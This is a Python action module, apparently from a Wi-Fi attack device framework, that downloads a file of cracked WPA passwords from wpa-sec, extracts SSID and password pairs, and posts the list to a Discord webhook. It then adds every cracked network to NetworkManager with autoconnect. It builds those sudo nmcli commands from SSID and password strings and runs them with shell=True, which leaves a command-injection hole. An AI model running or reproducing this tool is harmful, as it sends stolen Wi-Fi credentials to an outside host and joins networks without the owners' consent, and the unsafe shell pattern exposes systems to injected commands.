from rich.console import Console
from urllib.request import Request, urlopen
from dotenv import load_dotenv
import os
import requests
import time
import shutil
import subprocess


b_class = "WpaSecHarvesting"
b_module = "wpa_sec_harvesting"
b_status = "wpa_sec_harvesting_action"
b_port = 0
b_parent = None

class WpaSecHarvesting:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.console = Console()

    def execute(self):
        try:
            self.console.log(f"Starting action: {b_status}")
            self.download_and_process_file()
            self.process_networks()
            self.console.log(f"Action '{b_status}' completed successfully!")
        except Exception as e:
            self.console.log(f"Error in action '{b_status}': {e}", style="bold red")

    def download_and_process_file(self):
        self.console.log("Downloading and processing WPA-SEC file...")
        # Load variables from the .env file
        load_dotenv()

        # Read values from the .env file
        cookie_value = os.getenv('COOKIE_VALUE')
        url = os.getenv('URL')
        discord_webhook_url = os.getenv('DISCORD_WEBHOOK_URL')

        # Create a request with a cookie header
        req = Request(url, headers={'Cookie': f'key={cookie_value}'})

        # Download the file
        with urlopen(req) as response, open('wpa-sec.founds.potfile', 'wb') as out_file:
            out_file.write(response.read())

        print("File downloaded successfully.")

        # Read the data from the downloaded file wpa-sec.founds.potfile with proper encoding (utf-8)
        with open("wpa-sec.founds.potfile", "r", encoding="utf-8") as potfile:
            lines = potfile.readlines()

        # Store unique networks (SSID + password)
        unique_networks = set()

        # Process lines from wpa-sec.founds.potfile
        for line in lines:
            # Split the line by the ":" separator
            parts = line.strip().split(":")
            
            # Skip lines with fewer than 4 parts
            if len(parts) < 4:
                continue

            # Retain the last two parts (SSID + password)
            network_info = f"{parts[2]}:{parts[3]}"
            
            # Add to the set of unique networks
            unique_networks.add(network_info)

        # Try to read data from my-cracked.txt and add to the set of unique networks
        try:
            with open("my-cracked.txt", "r", encoding="utf-8") as cracked_file:
                cracked_lines = cracked_file.readlines()

            for line in cracked_lines:
                # Split the line by the ":" separator
                network_info = line.strip()
                
                # Add to the set of unique networks
                unique_networks.add(network_info)
        except FileNotFoundError:
            print("File my-cracked.txt not found. Continuing without it.")

        # Save unique networks to networks.txt with utf-8 encoding
        with open("networks.txt", "w", encoding="utf-8") as output_file:
            for network in sorted(unique_networks):
                output_file.write(f"{network}\n")

        print("Duplicates removed and data saved to networks.txt.")

        # Send the networks.txt file to Discord using the webhook
        with open("networks.txt", "rb") as file:
            response = requests.post(discord_webhook_url, files={"file": file})

        if response.status_code == 204:
            print("File networks.txt has been sent to Discord.")
        else:
            print(f"Failed to send the file. Error code: {response.status_code}")

    def process_networks(self):
        self.console.log("Processing networks...")
        input_file = "networks.txt"
        done_file = "networks_done.txt"

        if not shutil.which("nmcli"):
            print("nmcli is not installed. Please install it and try again.")
            return

        try:
            with open(input_file, "r") as f:
                all_networks = set(line.strip() for line in f if line.strip())
        except FileNotFoundError:
            print(f"I can't find the {input_file} file.")
            return

        try:
            with open(done_file, "r") as f:
                processed_networks = set(line.strip() for line in f if line.strip())
        except FileNotFoundError:
            processed_networks = set()

        new_networks = all_networks - processed_networks

        if not new_networks:
            print("No new networks found to process.")
            return

        # Get the default Wi-Fi interface
        try:
            result = subprocess.run(
                ["nmcli", "-t", "-f", "DEVICE,TYPE", "device", "status"],
                capture_output=True,
                text=True,
                check=True
            )
            wifi_device = next(
                (line.split(":")[0] for line in result.stdout.splitlines() if "wifi" in line),
                None
            )
            if not wifi_device:
                print("No Wi-Fi device found.")
                return
        except subprocess.CalledProcessError as e:
            print(f"Error while detecting Wi-Fi device: {e}")
            return

        for network in new_networks:
            try:
                ssid, password = network.split(":")
                
                # Check if the network already exists
                existing_connections = subprocess.run(
                    ["nmcli", "-t", "-f", "NAME", "connection", "show"],
                    capture_output=True,
                    text=True
                )
                if ssid in existing_connections.stdout.splitlines():
                    print(f"Network '{ssid}' already exists. Modifying...")
                    command = (
                        f'sudo nmcli connection modify "{ssid}" wifi-sec.key-mgmt wpa-psk '
                        f'wifi-sec.psk "{password}" connection.autoconnect yes'
                    )
                else:
                    print(f"Adding new network '{ssid}'...")
                    command = (
                        f'sudo nmcli connection add type wifi ifname "{wifi_device}" con-name "{ssid}" ssid "{ssid}" '
                        f'&& sudo nmcli connection modify "{ssid}" wifi-sec.key-mgmt wpa-psk '
                        f'wifi-sec.psk "{password}" connection.autoconnect yes'
                    )

                subprocess.run(command, shell=True, check=True)
                time.sleep(1)  # Delay between commands
            except ValueError:
                print(f"Invalid line format: {network}")
            except subprocess.CalledProcessError as e:
                print(f"Error while executing command: {e}")

        shutil.copyfile(input_file, done_file)
        print(f"Copy of the file saved under the name: {done_file}")
